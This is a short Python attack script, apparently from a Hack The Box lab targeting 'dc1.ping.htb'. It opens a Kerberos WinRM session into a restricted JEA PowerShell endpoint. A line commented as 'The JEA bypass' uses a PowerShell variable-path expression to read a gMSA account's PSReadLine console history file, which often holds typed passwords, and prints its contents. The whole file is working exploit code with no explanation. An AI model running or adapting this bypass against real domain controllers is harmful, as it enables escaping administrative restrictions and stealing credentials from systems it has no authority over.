from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
import os

print(f"[*] Using Kerberos Cache: {os.environ.get('KRB5CCNAME')}")

# Added ssl=False back to prevent the TLS handshake crash
wsman = WSMan('dc1.ping.htb', port=5985, ssl=False, auth='kerberos', encryption='always')

try:
    with RunspacePool(wsman, configuration_name='restricted') as pool:
        ps = PowerShell(pool)
        
        # The JEA bypass
        ps.add_script(r"${C:\Users\Pong_gMSA$\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt}")
        output = ps.invoke()
        
        print("\n[*] ConsoleHost_history.txt contents:\n")
        for line in output:
            print(str(line))
            
        if ps.had_errors:
            print("\n[!] PowerShell Errors:")
            for error in ps.streams.error:
                print(str(error))
                
except Exception as e:
    print(f"[-] Connection failed: {e}")
